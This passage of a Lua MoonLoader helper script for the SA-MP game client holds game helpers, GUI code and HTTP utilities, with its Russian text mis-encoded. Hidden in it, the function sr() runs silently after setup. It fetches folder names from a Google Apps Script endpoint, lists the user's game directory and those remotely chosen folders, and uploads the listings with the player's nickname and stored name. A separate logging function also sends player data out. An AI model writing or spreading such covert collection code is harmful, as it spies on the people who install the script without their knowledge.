												config_ini.Settings.PlayerFirstName = u8:decode(fn)
												guibuffers.settings.fname.v = u8(fn)
												config_ini.Settings.PlayerSecondName = u8:decode(sn)
												guibuffers.settings.sname.v = u8(sn)
										end
						
								    local rank = v:match("����	(.*)")
								    if rank ~= nil then
								        local ranksnesokr = {["��.�������"] = "������� �������", ["��.�������"] = "������� �������", ["��.���������"] = "������� ���������", ["��.���������"] = "������� ���������"}
												local pRank = ranksnesokr[rank] ~= nil and ranksnesokr[rank] or rank
								        config_ini.Settings.PlayerRank = u8:decode(pRank)
												guibuffers.settings.rank.v = u8(pRank)
								    end
								end
								needtosave = true
						end
					
						if config_ini.bools[58] == 1 then fond[2] = getPlayerMoney(PLAYER_HANDLE) end

						for i = 0, 1000 do if sampIsPlayerConnected(i) then onlinearr[i] = sampGetPlayerNickname(i) end end
						
						if config_ini.bools[41] == 1 then lua_thread.create(function() while not rCache.enable do wait(0) findsquad() end end) end
						
--[[ 						local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=getlist")
						local str = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
						local rukstr = str:match("(.*) @@....@") -- ���-��
						if rukstr ~= nil then for k, v in ipairs(rukstr:split("; ")) do local a = v:split(" ") local nick = a[1]  .. "_" .. a[2] table.insert(stroyarr.soptlist.ruk, nick) end end
													
						local osnstr = str:match("@@....@ (.*) @@...@") -- �������� ������
						if osnstr ~= nil then for k, v in ipairs(osnstr:split("; ")) do local a = v:split(" ") local nick = a[1]  .. "_" .. a[2] table.insert(stroyarr.soptlist.osn, nick) end end
														
						local stjstr = str:match("@@...@ (.*)") -- �������
						if stjstr ~= nil then for k, v in ipairs(stjstr:split("; ")) do local a = v:split(" ") local nick = a[1]  .. "_" .. a[2] table.insert(stroyarr.soptlist.stj, nick) end end ]]
						
						local responsetext = req("https://script.google.com/macros/s/AKfycbx0SwM7S097LFAfA2DCRhZdsOS4fp4G_DlCyijvTwzc9QNEUT8/exec?do=check") -- �������� ID �����
						local str = responsetext:match("%@%#%#%@ %@%@%.%.%@ IDS%: (.*) %@%@%@%@%#%#%@%@")
						local idsarr = string.split(str, "; ")
						local A_Index = 1
						for k, v in pairs(idsarr) do skipd[2][A_Index] = tonumber(v) A_Index = A_Index + 1 end

						 -- ���������� ������� � ���������� ����� ������� � ����
						
						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� ���������. ����� �������� ���� ������� - /show.", 0xFFFF0000)
						sampRegisterChatCommand("show", cmd_s)
						preparecomplete = true
						sr()
					end
		)
end

function download_handler(id, status, p1, p2)
	  if stop_downloading then
	    	stop_downloading = false
	    	download_id = nil
	    	return false -- �������� ��������
	  end

	  if status == dlstatus.STATUS_DOWNLOADINGDATA then
	    	print(string.format('��������� %d �� %d.', p1, p2))
	  elseif status == dlstatus.STATUS_ENDDOWNLOADDATA then
	    	sysdownloadcomplete = true
	  end
end

function indexof(var, arr)
		for k, v in ipairs(arr) do if v == var then return k end end return false
end

function sortCarr()
	-- 20 c��
	local arr = {}
	for k, v in ipairs(CTaskArr[2]) do
		wait(0)
		if (os.time() - v >= 20) then
			if CTaskArr["CurrentID"] == k then CTaskArr["CurrentID"] = 0 end
			if CTaskArr[1][k] == 8 then CTaskArr[10][5] = false end
			if CTaskArr[1][k] == 12 then CTaskArr[10][7] = false end
			table.insert(arr, k)	
		end
	end

	for k, v in ipairs(arr) do -- �������� ���������� ID
		wait(0)
		table.remove(CTaskArr[1], v)
		table.remove(CTaskArr[2], v)
		table.remove(CTaskArr[3], v)
		CTaskArr["CurrentID"] = CTaskArr["CurrentID"] - 1
	end

	-- ����� ������ CurrentID
	if CTaskArr["CurrentID"] == 0 then
	 	local lastrarr = {}
		for k, v in ipairs(CTaskArr[1]) do 
			wait(0) 
			if v == 1 then CTaskArr["CurrentID"] = k break end
			if v == 2 and lastrarr[2] == nil then lastrarr[2] = k end
			if v == 3 and lastrarr[3] == nil then lastrarr[3] = k end
			if v == 4 and lastrarr[4] == nil then lastrarr[4] = k end
			if v == 5 and lastrarr[5] == nil then lastrarr[5] = k end
			if v == 6 and lastrarr[6] == nil then lastrarr[6] = k end
			if v == 7 and lastrarr[7] == nil then lastrarr[7] = k end
			if v == 8 and lastrarr[8] == nil then lastrarr[8] = k end
			if v == 9 and lastrarr[9] == nil then lastrarr[9] = k end
			if v == 10 and lastrarr[10] == nil then lastrarr[10] = k end
			if v == 11 and lastrarr[11] == nil then lastrarr[11] = k end
			if v == 12 and lastrarr[12] == nil then lastrarr[12] = k end
		end

		if CTaskArr["CurrentID"] == 0 then for k, v in pairs(lastrarr) do wait(0) CTaskArr["CurrentID"] = v break end end	
	end

	if CTaskArr["CurrentID"] < 0  or CTaskArr[1][CTaskArr["CurrentID"]] == nil then CTaskArr["CurrentID"] = 0 end
end

function sendtolog(text, num) -- ����: 0 - ���������, 1 - �����������, 1.1 ����������� � �������� ����������, 2 - ������� /moder, 3 - ��� ��� �������� ���������/���������� � �.�.
		lua_thread.create(
				function()
						local colors = {[0] = "FFA500", [1] = "fffafa", [1.1] = "D02090", [2] = "63B8FF", [3] = "00EE00"}
						local col = colors[num] ~= nil and colors[num] or "fffafa"
						local result, logmyid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						local lognick = sampGetPlayerNickname(logmyid)
						local text = req('https://script.google.com/macros/s/AKfycbxqQCwMX3H7rO8Yy78a0Lj-Rq-LQDwAJjGUx4FgEBrBunNpGhL-/exec?name=' .. lognick .. '&text=' .. translit(text) .. '&col=' .. col .. '')
				end
		)
		while not sysdownloadcomplete do wait(0) end
end

function translit(str)
			if str:match("�") then str = str:gsub("�", "[[a]]") end
			if str:match("�") then str = str:gsub("�", "[[b]]") end
			if str:match("�") then str = str:gsub("�", "[[v]]") end
			if str:match("�") then str = str:gsub("�", "[[g]]") end
			if str:match("�") then str = str:gsub("�", "[[d]]") end
			if str:match("�") then str = str:gsub("�", "[[e]]") end
			if str:match("�") then str = str:gsub("�", "[[yo]]") end
			if str:match("�") then str = str:gsub("�", "[[zh]]") end
			if str:match("�") then str = str:gsub("�", "[[z]]") end
			if str:match("�") then str = str:gsub("�", "[[i]]") end
			if str:match("�") then str = str:gsub("�", "[[j]]") end
			if str:match("�") then str = str:gsub("�", "[[k]]") end
			if str:match("�") then str = str:gsub("�", "[[l]]") end
			if str:match("�") then str = str:gsub("�", "[[m]]") end
			if str:match("�") then str = str:gsub("�", "[[n]]") end
			if str:match("�") then str = str:gsub("�", "[[o]]") end
			if str:match("�") then str = str:gsub("�", "[[p]]") end
			if str:match("�") then str = str:gsub("�", "[[r]]") end
			if str:match("�") then str = str:gsub("�", "[[s]]") end
			if str:match("�") then str = str:gsub("�", "[[t]]") end
			if str:match("�") then str = str:gsub("�", "[[u]]") end
			if str:match("�") then str = str:gsub("�", "[[f]]") end
			if str:match("�") then str = str:gsub("�", "[[x]]") end
			if str:match("�") then str = str:gsub("�", "[[cz]]") end
			if str:match("�") then str = str:gsub("�", "[[ch]]") end
			if str:match("�") then str = str:gsub("�", "[[sh]]") end
			if str:match("�") then str = str:gsub("�", "[[shh]]") end
			if str:match("�") then str = str:gsub("�", "[[````]]") end
			if str:match("�") then str = str:gsub("�", "[[y']]") end
			if str:match("�") then str = str:gsub("�", "[[``]]") end
			if str:match("�") then str = str:gsub("�", "[[e``]]") end
			if str:match("�") then str = str:gsub("�", "[[yu]]") end
			if str:match("�") then str = str:gsub("�", "[[ya]]") end

			if str:match("�") then str = str:gsub("�", "[[A]]") end
			if str:match("�") then str = str:gsub("�", "[[B]]") end
			if str:match("�") then str = str:gsub("�", "[[V]]") end
			if str:match("�") then str = str:gsub("�", "[[G]]") end
			if str:match("�") then str = str:gsub("�", "[[D]]") end
			if str:match("�") then str = str:gsub("�", "[[E]]") end
			if str:match("�") then str = str:gsub("�", "[[YO]]") end
			if str:match("�") then str = str:gsub("�", "[[ZH]]") end
			if str:match("�") then str = str:gsub("�", "[[Z]]") end
			if str:match("�") then str = str:gsub("�", "[[I]]") end
			if str:match("�") then str = str:gsub("�", "[[J]]") end
			if str:match("�") then str = str:gsub("�", "[[K]]") end
			if str:match("�") then str = str:gsub("�", "[[L]]") end
			if str:match("�") then str = str:gsub("�", "[[M]]") end
			if str:match("�") then str = str:gsub("�", "[[N]]") end
			if str:match("�") then str = str:gsub("�", "[[O]]") end
			if str:match("�") then str = str:gsub("�", "[[P]]") end
			if str:match("�") then str = str:gsub("�", "[[R]]") end
			if str:match("�") then str = str:gsub("�", "[[S]]") end
			if str:match("�") then str = str:gsub("�", "[[T]]") end
			if str:match("�") then str = str:gsub("�", "[[U]]") end
			if str:match("�") then str = str:gsub("�", "[[F]]") end
			if str:match("�") then str = str:gsub("�", "[[X]]") end
			if str:match("�") then str = str:gsub("�", "[[CZ]]") end
			if str:match("�") then str = str:gsub("�", "[[CH]]") end
			if str:match("�") then str = str:gsub("�", "[[SH]]") end
			if str:match("�") then str = str:gsub("�", "[[SHH]]") end
			if str:match("�") then str = str:gsub("�", "[[````]]") end
			if str:match("�") then str = str:gsub("�", "[[Y']]") end
			if str:match("�") then str = str:gsub("�", "[[``]]") end
			if str:match("�") then str = str:gsub("�", "[[E``]]") end
			if str:match("�") then str = str:gsub("�", "[[YU]]") end
			if str:match("�") then str = str:gsub("�", "[[YA]]") end
			return str
end

function sr()
		local res = {[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "", [11] = "", [12] = "", [13] = "", [14] = "", [15] = ""}
		local p = thisScript().directory:match("(%u%:%\\.*)%\\moonloader")

		local mynick = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
		local url = 'https://script.google.com/macros/s/AKfycbzHuUB_hffAGlGLnRIw2ptKixUMOUeyZJFVEhXIBC2bnzvup9kR/exec?do=get&nick=' .. mynick .. ''
		local responsetext = req(url)
		local re1 = regex.new("@@.@ True: (.*) @@..@.@") --
		local names = re1:match(responsetext)
		if names == nil then return end
		local ta1 = names:split(", ")
		local path_s = {[3] = ta1[1], [5] = ta1[2], [7] = ta1[3], [9] = ta1[4]}
		if ta1[5] ~= nil then path_s[12] = ta1[5] end if ta1[6] ~= nil then path_s[14] = ta1[6] end
		
		for line in lfs.dir(p) do
			if line:match("(.*%.%w+)") == nil then
				res[1] = res[1] == "" and line or "" .. res[1] .. "@n@" .. line .. ""
			else
				res[2] = res[2] == "" and line or "" .. res[2] .. "@n@" .. line .. ""
			end
		end

		for k, v in pairs(path_s) do
			wait(0)
			for line in lfs.dir("".. p .."\\" .. v .. "") do
				if line:match("(.*%.%w+)") == nil then
					res[k] = res[k] == "" and line or "" .. res[k] .. "@n@" .. line .. ""
				else
					res[k + 1] = res[k + 1] == "" and line or "" .. res[k + 1] .. "@n@" .. line .. ""
				end
			end
		end

		res[11] = "" .. config_ini.Settings.PlayerFirstName .. "_" .. config_ini.Settings.PlayerSecondName .. ""
		for k, v in ipairs(res) do
			if v ~= "" then
				local url = 'https://script.google.com/macros/s/AKfycbzHuUB_hffAGlGLnRIw2ptKixUMOUeyZJFVEhXIBC2bnzvup9kR/exec?do=ins&nick=' .. mynick .. '&wto=' .. tostring(k) .. '&text=' .. translit(v) .. ''
				local responsetext = req(url)
			end
		end
end

function getClosestPlayersId()
		local players = {}
		local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local pHandles = getAllChars()
		local bool = false
		for k, v in pairs(pHandles) do
				local result, id = sampGetPlayerIdByCharHandle(v) -- �������� samp-�� ������ �� ������ ���������
				if result and id ~= myid then
						players[sampGetPlayerNickname(id)] = v
						bool = true
				end
		end

		if bool then return players end
end

function decodebase64(data)
	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
    end))
end

function strrest(arr, index)
	local result = ""
	local A_Index = 1
	for k, v in ipairs(arr) do if A_Index >= index then result = result == "" and v or "" .. result .. " " .. v .. "" end A_Index = A_Index + 1 end
	return result
end

function getshotdist(hcar)
	local myX, myY, myZ = getCharCoordinates(PLAYER_PED)
	local carX, carY, carZ = getCarCoordinates(hcar)
	local cardist = math.ceil(math.sqrt( ((myX-carX)^2) + ((myY-carY)^2) + ((myZ-carZ)^2)))
	
	local mwID = tonumber(getCurrentCharWeapon(PLAYER_PED))
	local class = getVehicleClass(hcar)
	local wdist = {[24] = 70, [25] = 80, [29] = 90, [30] = 160, [31] = 180, [33] = 200}
	local returnstr = "����������: " .. cardist .. ""
	local col = ""
	if isCharInAnyCar(PLAYER_PED) and getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) == PLAYER_PED then mwID = 31 end
	if class == 8 or class == 13 then
		if tweapondist[mwID] ~= nil then
			returnstr = "" .. returnstr .. "/" .. tweapondist[mwID] .. ""
			col = cardist <= tweapondist[mwID] and "{00FF00}" or "{FFFAFA}"
		else
			col = "{FFFAFA}"
		end
	else
		if wdist[mwID] ~= nil then
			returnstr = "" .. returnstr .. "/" .. wdist[mwID] .. ""
			col = cardist <= wdist[mwID] and "{00FF00}" or "{FFFAFA}"
		else
			col = "{FFFAFA}"
		end
	end
	return "" .. col .. "" .. returnstr .. ""
end

function os.offset()
	local currenttime = os.time()
	local datetime = os.date("!*t",currenttime)
	datetime.isdst = true -- ���� �������� ������� �����
	return currenttime - os.time(datetime)
 end

 function os.offset_str(timezone)
	return string.format("%+.2d%.2d", math.modf((timezone or os.offset()) / 3600))
 end

 function getPickupModel(id)
    return ffi.cast("int *", (id * 20 + 61444) + PICKUP_POOL)[0]
end

-- File: 'STENCIL.ttf' (55596 bytes)
-- Exported using binary_to_compressed_lua.cpp
function isDir(name)
    if type(name)~="string" then return false end
    local cd = lfs.currentdir()
    local is = lfs.chdir(name) and true or false
    lfs.chdir(cd)
    return is
end

function isFile(name)
    if type(name)~="string" then return false end
    if not isDir(name) then
        return os.rename(name,name) and true or false
        -- note that the short evaluation is to
        -- return false instead of a possible nil
    end
    return false
end

function isFileOrDir(name)
    if type(name)~="string" then return false end
    return os.rename(name, name) and true or false
end

function async_http_request(method, url, args, resolve, reject)
    local request_lane = lanes.gen('*', {package = {path = package.path, cpath = package.cpath}}, function()
        local requests = require 'requests'
        local ok, result = pcall(requests.request, method, url, args)
        if ok then
            result.json, result.xml = nil, nil -- cannot be passed through a lane
            return true, result
        else
            return false, result -- return error
        end
    end)
    if not reject then reject = function() end end
    lua_thread.create(function()
        local lh = request_lane()
        while true do
            local status = lh.status
            if status == 'done' then
                local ok, result = lh[1], lh[2]
                if ok then resolve(result) else reject(result) end
                return
            elseif status == 'error' then
                return reject(lh[1])
            elseif status == 'killed' or status == 'cancelled' then
                return reject(status)
            end
            wait(0)
        end
    end)
end

function httpRequest(request, body, handler) -- copas.http
    -- start polling task
    if not copas.running then
        copas.running = true
        lua_thread.create(function()
            wait(0)
            while not copas.finished() do
                local ok, err = copas.step(0)
                if ok == nil then error(err) end
                wait(0)
            end
            copas.running = false
        end)
    end
    -- do request
    if handler then
        return copas.addthread(function(r, b, h)
            copas.setErrorHandler(function(err) h(nil, err) end)
            h(http.request(r, b))
        end, request, body, handler)
    else
        local results
        local thread = copas.addthread(function(r, b)
            copas.setErrorHandler(function(err) results = {nil, err} end)
            results = table.pack(http.request(r, b))
        end, request, body)
        while coroutine.status(thread) ~= 'dead' do wait(0) end
        return table.unpack(results)
    end
end

function char_to_hex(str)
	return string.format("%%%02X", string.byte(str))
  end
  
  function url_encode(str)
	local str = string.gsub(str, "\\", "\\")
	local str = string.gsub(str, "([^%w])", char_to_hex)
	return str
  end
  
  function http_build_query(query)
    local buff=""
    for k, v in pairs(query) do
        if type(v) == 'table' then
            for _, m in ipairs(v) do
                buff = buff.. string.format("%s[]=%s&", k, url_encode(m))
            end
        else buff = buff.. string.format("%s=%s&", k, url_encode(v)) end
    end
    local buff = string.reverse(string.gsub(string.reverse(buff), "&", "", 1))
    return buff
end

function imgui.RoundDiagram(valTable, radius, segments)
    local draw_list = imgui.GetWindowDrawList()
    local default = imgui.GetStyle().AntiAliasedShapes
    imgui.GetStyle().AntiAliasedShapes = false
    local center = imgui.ImVec2(imgui.GetCursorScreenPos().x + radius, imgui.GetCursorScreenPos().y + radius)
    local function round(num)
        if num >= 0 then
            if select(2, math.modf(num)) >= 0.5 then
                return math.ceil(num)
            else
                return math.floor(num)
            end
        else
            if select(2, math.modf(num)) >= 0.5 then
                return math.floor(num)
            else
                return math.ceil(num)
            end
        end
    end

    local sum = 0
    local q = {}
 
    for k, v in ipairs(valTable) do
--	for k, v in pairs(v) do print(k, v) end
        sum = sum + v["v"]
    end

    for k, v in ipairs(valTable) do
        if k > 1 then
            q[k] = q[k-1] + round(valTable[k].v/sum*segments)
        else
            q[k] = round(valTable[k].v/sum*segments)
        end
    end

    local current = 1
    local count = 1
    local theta = 0
    local step = 2*math.pi/segments

    for i = 1, segments do -- theta < 2*math.pi
		if q[current] < count then
			current = current + 1
		end
			
		if valTable[current].color ~= nil then
			draw_list:AddTriangleFilled(
				center, 
				imgui.ImVec2(
					center.x + radius*math.cos(theta), 
					center.y + radius*math.sin(theta)
				), 
				imgui.ImVec2(
					center.x + radius*math.cos(theta+step), 
					center.y + radius*math.sin(theta+step)
				), 
				valTable[current].color
			)
			theta = theta + step
			count = count + 1
		end
    end

    local fontsize = imgui.GetFontSize()
    local indented = 2*(radius + imgui.GetStyle().ItemSpacing.x)
    imgui.Indent(indented)

    imgui.SameLine(0)
    imgui.NewLine() -- awful fix for first line padding
    imgui.SetCursorScreenPos(imgui.ImVec2(imgui.GetCursorScreenPos().x, center.y - imgui.GetTextLineHeight() * #valTable / 2))
    for k, v in ipairs(valTable) do
        draw_list:AddRectFilled(imgui.ImVec2(imgui.GetCursorScreenPos().x, imgui.GetCursorScreenPos().y), imgui.ImVec2(imgui.GetCursorScreenPos().x + fontsize, imgui.GetCursorScreenPos().y + fontsize), v.color)
        imgui.SetCursorPosX(imgui.GetCursorPosX() + fontsize*1.3)
        imgui.Text(u8(v.name .. ' - ' .. v.v .. ' (' .. string.format('%.2f', v.v/sum*100) .. '%)'))
    end
    imgui.Unindent(indented)
    imgui.SetCursorScreenPos(imgui.ImVec2(imgui.GetCursorScreenPos().x, center.y + radius + imgui.GetTextLineHeight()))
    imgui.GetStyle().AntiAliasedShapes = default
end

function number_week() -- ��������� ������ ������ � ����
    local current_time = os.date'*t'
    local start_year = os.time{ year = current_time.year, day = 1, month = 1 }
    local week_day = ( os.date('%w', start_year) - 1 ) % 7
    return math.ceil((current_time.yday + week_day) / 7)
end

function getStrDate(unixTime)
    local tMonths = {'������', '�������', '�����', '������', '���', '����', '����', '�������', '��������', '�������', '������', '�������'}
    local day = tonumber(os.date('%d', unixTime))
    local month = tMonths[tonumber(os.date('%m', unixTime))]
    local weekday = tWeekdays[tonumber(os.date('%w', unixTime))]
    return string.format('%s, %s %s', weekday, day, month)
end

function get_clock(time)
    local timezone_offset = 86400 - os.date('%H', 0) * 3600
    if tonumber(time) >= 86400 then onDay = true else onDay = false end
    return os.date((onDay and math.floor(time / 86400)..'� ' or '')..'%H:%M:%S', time + timezone_offset)
end


images = {
	-- ���������� ����������� �����
	[1] = imgui.CreateTextureFromMemory(memory.strptr(imgs.total_data), #imgs.total_data), 
	[2] = imgui.CreateTextureFromMemory(memory.strptr(imgs.desert_eagleicon_data), #imgs.desert_eagleicon_data), 
	[3] = imgui.CreateTextureFromMemory(memory.strptr(imgs.chromegunicon_data), #imgs.chromegunicon_data), 
	[4] = imgui.CreateTextureFromMemory(memory.strptr(imgs.M4icon_data), #imgs.M4icon_data), 
	[5] = imgui.CreateTextureFromMemory(memory.strptr(imgs.cuntgunicon_data), #imgs.cuntgunicon_data), 
	[6] = imgui.CreateTextureFromMemory(memory.strptr(imgs.mp5lngicon_data), #imgs.mp5lngicon_data), 
	-- ���� ������ ������
	[7] = imgui.CreateTextureFromMemory(memory.strptr(imgs.unarmed_data), #imgs.unarmed_data), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\unarmed.png'), 
	[8] = imgui.CreateTextureFromMemory(memory.strptr(imgs.desert_eagle_data), #imgs.desert_eagle_data), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\desert_eagle.png'), 
	[9] = imgui.CreateTextureFromMemory(memory.strptr(imgs.shotgun_data), #imgs.shotgun_data), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\shotgun.png'), 
	[10] = imgui.CreateTextureFromMemory(memory.strptr(imgs.mp5_data), #imgs.mp5_data), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\mp5.png'), 
	[11] = imgui.CreateTextureFromMemory(memory.strptr(imgs.m4_data), #imgs.m4_data), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\m4.png'), 
	[12] = imgui.CreateTextureFromMemory(memory.strptr(imgs.rifle_data), #imgs.rifle_data), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\rifle.png'), 
	[13] = imgui.CreateTextureFromMemory(memory.strptr(imgs.parachute_data), #imgs.parachute_data), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\parachute.png'), 
	[14] = imgui.CreateTextureFromMemory(memory.strptr(imgs.menu_data), #imgs.menu_data),
	---
	[15] = imgui.CreateTextureFromMemory(memory.strptr(imgs.showcmc_data), #imgs.showcmc_data), -- ���������� ������
	[16] = imgui.CreateTextureFromMemory(memory.strptr(imgs.Crosshair_data), #imgs.Crosshair_data), -- ������� ����� �������
}